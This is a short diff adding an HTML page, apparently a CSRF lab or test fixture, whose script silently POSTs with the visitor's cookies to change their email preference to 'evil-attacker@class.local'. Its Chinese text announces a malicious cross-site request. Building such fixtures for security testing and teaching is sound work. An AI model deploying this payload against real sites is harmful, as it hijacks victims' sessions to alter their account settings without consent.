@@ -1,0 +1,12 @@
+<!doctype html>
+<html lang="zh-CN"><body>
+<script>
+fetch('/api/csrf/settings?mode={{ mode }}', {
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ email_pref: 'evil-attacker@class.local' })
+});
+</script>
+恶意页面已尝试发起跨站 JSON 请求。
+</body></html>
